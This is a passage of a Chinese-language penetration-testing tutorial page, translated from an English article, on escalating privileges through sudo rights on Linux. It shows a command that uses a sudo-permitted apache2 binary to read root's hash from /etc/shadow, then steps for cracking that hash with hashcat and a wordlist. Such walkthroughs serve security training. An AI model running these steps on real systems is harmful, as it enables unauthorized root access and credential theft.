<!doctype html>
<html lang="zh" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透/Linux 提权/Linux 提权-Sudo_2" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Linux 提权-Sudo_2 | 扛枪的书生</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-Sudo_2"><meta data-rh="true" property="og:locale" content="zh"><meta data-rh="true" name="docusaurus_locale" content="zh"><meta data-rh="true" name="docsearch:language" content="zh"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Linux 提权-Sudo_2 | 扛枪的书生"><meta data-rh="true" name="description" content="本文通过 Google 翻译 Sudo Part-2 – Linux Privelege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达不准确的字词进行了校正及个别注释补充。"><meta data-rh="true" property="og:description" content="本文通过 Google 翻译 Sudo Part-2 – Linux Privelege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达不准确的字词进行了校正及个别注释补充。"><link data-rh="true" rel="icon" href="/web/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-Sudo_2"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-Sudo_2" hreflang="zh"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-Sudo_2" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://SPYLCPE3W9-dsn.algolia.net" crossorigin="anonymous"><link rel="alternate" type="application/rss+xml" href="/web/blog/rss.xml" title="扛枪的书生 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/web/blog/atom.xml" title="扛枪的书生 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="扛枪的书生" href="/web/opensearch.xml"><link rel="stylesheet" href="/web/assets/css/styles.bd0a5f0e.css">
<script src="/web/assets/js/runtime~main.224207a9.js" defer="defer"></script>
<script src="/web/assets/js/main.e046f592.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/web/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top navbarHideable_m1mJ navbar--primary"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/web/"><div class="navbar__logo"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/web/docs/">文章</a><a class="navbar__item navbar__link" href="/web/blog">说说</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">其它</a><ul class="dropdown__menu"><li><a href="https://www.douban.com/doulist/154252035/" target="_blank" rel="noopener noreferrer" class="dropdown__link">豆瓣<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.zhihu.com/people/KqdsshenG" target="_blank" rel="noopener noreferrer" class="dropdown__link">知乎<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.cnblogs.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">博客园<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://github.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">GitHub<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="navbar__items navbar__items--right"><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd sidebarWithHideableNavbar_wUlq"><a tabindex="-1" class="sidebarLogo_isFc" href="/web/"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></a><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/web/docs/">软件百宝箱</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/web/docs/category/渗透">渗透</a><button aria-label="折叠侧边栏分类 &#x27;渗透&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/web/docs/category/linux-提权">Linux 提权</a><button aria-label="折叠侧边栏分类 &#x27;Linux 提权&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Capabilities">Linux 提权-Capabilities</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Cron Jobs">Linux 提权-Cron Jobs</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Docker 容器">Linux 提权-Docker 容器</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-LXD 容器">Linux 提权-LXD 容器</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-MySQL UDF">Linux 提权-MySQL UDF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-NFS 共享">Linux 提权-NFS 共享</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_1">Linux 提权-SUID_SGID_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_2">Linux 提权-SUID_SGID_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Sudo_1">Linux 提权-Sudo_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Sudo_2">Linux 提权-Sudo_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-内核利用">Linux 提权-内核利用</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-密码搜寻">Linux 提权-密码搜寻</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权指南">Linux 提权指南</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/windows-提权">Windows 提权</a><button aria-label="展开侧边栏分类 &#x27;Windows 提权&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/linux">Linux</a><button aria-label="展开侧边栏分类 &#x27;Linux&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/windows">Windows</a><button aria-label="展开侧边栏分类 &#x27;Windows&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/杂项-1">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav><button type="button" title="收起侧边栏" aria-label="收起侧边栏" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/web/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/渗透"><span itemprop="name">渗透</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/linux-提权"><span itemprop="name">Linux 提权</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Linux 提权-Sudo_2</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Linux 提权-Sudo_2</h1></header><blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/sudo-part-2-lpe/" target="_blank" rel="noopener noreferrer">Sudo Part-2 – Linux Privelege Escalation</a> 这篇文章所产生，本人仅是对机器翻译中部分表达不准确的字词进行了校正及个别注释补充。</p>
</blockquote>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="导航">导航<a href="#导航" class="hash-link" aria-label="导航的直接链接" title="导航的直接链接">​</a></h2>
<ul>
<li><a href="#id0">0 前言</a></li>
<li><a href="#id1">1 第 1 部分快速回顾</a></li>
<li><a href="#id2">2 利用 Sudo 命令 – 滥用预期功能</a>
<ul>
<li><a href="#id2.1">2.1 使用 Hashcat 破解 Shadows 哈希</a></li>
</ul>
</li>
<li><a href="#id3">3 利用 Sudo 命令 – LD_PRELOAD 注入</a></li>
<li><a href="#id4">4 利用 Sudo 命令 – Sudo 令牌重用</a>
<ul>
<li><a href="#id4.1">4.1 Shell 升级 – 完整 TTY</a></li>
<li><a href="#id4.2">4.2 Sudo 令牌重用条件</a></li>
<li><a href="#id4.3">4.3 手动寻找 Sudo 令牌重用条件</a></li>
<li><a href="#id4.4">4.4 自动寻找 Sudo 令牌重用条件 – LinPEAS</a></li>
<li><a href="#id4.5">4.5 利用 Sudo 令牌重用</a>
<ul>
<li><a href="#id4.5.1">4.5.1 exploit.sh</a></li>
<li><a href="#id4.5.2">4.5.2 exploit_v2.sh</a></li>
<li><a href="#id4.5.3">4.5.3 exploit_v3.sh</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#id5">5 利用 Sudo 命令 – Sudo 版本 ≤1.8.27 (CVE-2019-14287)</a>
<ul>
<li><a href="#id5.1">5.1 枚举 Sudo 的版本</a></li>
<li><a href="#id5.2">5.2 在 Google 上搜索公开漏洞</a></li>
<li><a href="#id5.3">5.3 利用 CVE-2019-14287</a></li>
</ul>
</li>
<li><a href="#id6">6 利用 Sudo 命令 – Sudo 版本 ≤1.9.12p1 (CVE-2023-22809)</a>
<ul>
<li><a href="#id6.1">6.1 了解 sudoedit 的工作原理</a></li>
<li><a href="#id6.2">6.2 在 Google 上搜索公开漏洞</a></li>
<li><a href="#id6.3">6.3 查看 CVE-2023-22809 漏洞利用脚本</a></li>
<li><a href="#id6.4">6.4 利用 CVE-2023-22809</a></li>
</ul>
</li>
</ul>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="0前言"><strong><div id="id0">0、前言</div></strong><a href="#0前言" class="hash-link" aria-label="0前言的直接链接" title="0前言的直接链接">​</a></h2>
<p>在这篇文章中，我们将继续第 2 部分，了解如何通过滥用二进制文件 <strong>sudo</strong>特权来提权。</p>
<blockquote>
<p>如果您尚未查看 <strong><a href="https://www.cnblogs.com/kqdssheng/p/18198105" target="_blank" rel="noopener noreferrer">第 1 部分</a></strong> ，我强烈建议您在阅读本文之前先从第 1 部分开始。</p>
</blockquote>
<p>在第 2 部分中，我们将把重点转向更高级的漏洞利用主题，例如：滥用预期功能（即在 GTFOBins 上未发现的二进制文件的额外功能）、LD_PRELOAD、令牌重用以及两个针对 <strong>sudo</strong>特定版本的 CVE 。</p>
<p>在我们开始讨论漏洞利用示例之前，让我们快速回顾一下第 1 部分中介绍的内容。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="1第-1-部分快速回顾"><strong><div id="id1">1、第 1 部分快速回顾</div></strong><a href="#1第-1-部分快速回顾" class="hash-link" aria-label="1第-1-部分快速回顾的直接链接" title="1第-1-部分快速回顾的直接链接">​</a></h2>
<p>在这篇文章的第 1 部分中，我们了解到…</p>
<ul>
<li><strong>sudo</strong>是什么以及它是如何工作的</li>
<li>如何手动寻找<strong>sudo</strong>权限</li>
<li>使用工具枚举<strong>sudo</strong>权限 (LinPEAS)</li>
<li><strong>GTFOBins</strong>是什么以及如何使用它</li>
<li>如何利用 GTFOBins 来利用四种不同的标准二进制文件：<strong>nmap、rsync、bzip2</strong>和<strong>dd</strong></li>
</ul>
<p>在第一篇文章中枚举和利用sudo权限之前，我们首先通过找到的凭据并以标准用户<strong>cain</strong>进行 SSH 登录，以在受害者机器上获得初步立足点 。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030759-349962614-2bc30a9b843aeeaf336b1bce3da45745.png" width="548" height="270" class="img_ev3q"></p>
<p>除了我们已经在受害者身上利用的四个二进制文件之外，用户<strong>sudo -l</strong>输出中还有其它3个条目。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030594-609569468-ce07a774fceca7e9458c609ba956727f.png" width="510" height="143" class="img_ev3q"></p>
<p>在本文的第二部分中，我们将重点关注这3个命令作为我们的特权升级示例。</p>
<p>在本文的每个示例中，我们都不会在 GTFOBins 上发现漏洞。相反，我们需要了解这些程序如何工作然后才能利用它们。</p>
<p>Let’s jump in!</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="2利用-sudo-命令--滥用预期功能"><strong><div id="id2">2、利用 Sudo 命令 – 滥用预期功能</div></strong><a href="#2利用-sudo-命令--滥用预期功能" class="hash-link" aria-label="2利用-sudo-命令--滥用预期功能的直接链接" title="2利用-sudo-命令--滥用预期功能的直接链接">​</a></h2>
<p>在我们的第一个示例中，我们将针对上面 <strong>sudo -l</strong> 输出中发现的<strong>apache2</strong>这个二进制文件：(ALL : ALL) NOPASSWD: /usr/sbin/apache2</p>
<p>正如我们在第 1 部分中看到的，当我们发现我们对标准二进制文件具有<strong>sudo</strong>权限时，我们首先应该检查的第一件事是，该二进制文件是否在 GTFOBins 上具有可利用漏洞。</p>
<p>然而，在这种情况下，当我们过滤“apache”时，我们没有得到任何结果（即没有可用的漏洞利用！）</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030340-618634857-e43bf81553f42bccec44d2a8c9c38f2e.png" width="834" height="325" class="img_ev3q"></p>
<p>由于该二进制文件不在 GTFOBins 上，因此我们可以假设它不易受到攻击。或者，我们可以继续挖掘，看看是否可以以其它方式利用它。</p>
<p>我们可以通过Google搜索“<strong>apache2 sudo privilege escalation</strong>”来挖掘。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030890-475770965-03b67e54c7ac85444f74628b4bea0b28.png" width="851" height="662" class="img_ev3q"></p>
<p>前两个链接看起来很有希望，通过检查第一个链接我们可以看到它表明<strong>apache2</strong>存在文件读取漏洞！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030816-1232461906-dbac65e337e50740b9f0cef9a98f5adf.png" width="654" height="466" class="img_ev3q"></p>
<p>看起来这个漏洞利用会输出任何文件的第一行。对我们来说幸运的是，shadow文件的第一行包含root用户的hash值！</p>
<p>测试漏洞利用...</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo /usr/sbin/apache2 -f /etc/shadow</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030458-895367129-21fe7741dd8f399aed13b79264e17cc4.png" width="953" height="74" class="img_ev3q"></p>
<p>有用！我们可以在这里看到它从 <strong>/etc/shadow</strong> 文件中提取了root的哈希值。</p>
<blockquote>
<p>如果我们的谷歌搜索不那么幸运，下一步将是搜索可能被滥用的预期功能。为此，我们需要使用 <strong>-h</strong> 或 <strong>–help</strong> 开关检查帮助页面。</p>
</blockquote>
<p>现在我们已经从<strong>影子文件</strong>中提取了root哈希，我们需要破解它。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="21使用-hashcat-破解-shadows-哈希"><strong><div id="id2.1">2.1、使用 Hashcat 破解 Shadows 哈希</div></strong><a href="#21使用-hashcat-破解-shadows-哈希" class="hash-link" aria-label="21使用-hashcat-破解-shadows-哈希的直接链接" title="21使用-hashcat-破解-shadows-哈希的直接链接">​</a></h4>
<p>由于我们只需要hash值本身，因此我们只需从 <code>$6$</code>复制 到 SHA-512 字符串的末尾。将其复制到攻击者计算机后，它应该如下所示：</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190031156-290205991-6bfa57f315b0679cb2cb2c9099789172.png" width="804" height="95" class="img_ev3q"></p>
<p>接下来我们需要寻找该哈希类型的破解模式，然后才能继续破解。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hashcat -h | grep -i &#x27;$6&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030825-297500934-b9def53648ff8da613ac2413e842ab59.png" width="655" height="78" class="img_ev3q"></p>
<p>这告诉我们我们有一个 SHA-512 Unix 操作系统哈希值。</p>
<p>由于 Unix SHA-512 哈希值很不错，因此尝试遍历 <strong>rockyou.txt</strong> 文件的所有字串将需要几个小时。因此，我们可以使用较短版本的 <strong>rockyou</strong> 来加快速度。如果我们不成功，我们可以建立一个更大的词汇表。</p>
<blockquote>
<p>您可以从<a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreferrer">SecLists</a>获得一些缩短版本的 rockyou 文件，以及更多好的字典。</p>
</blockquote>
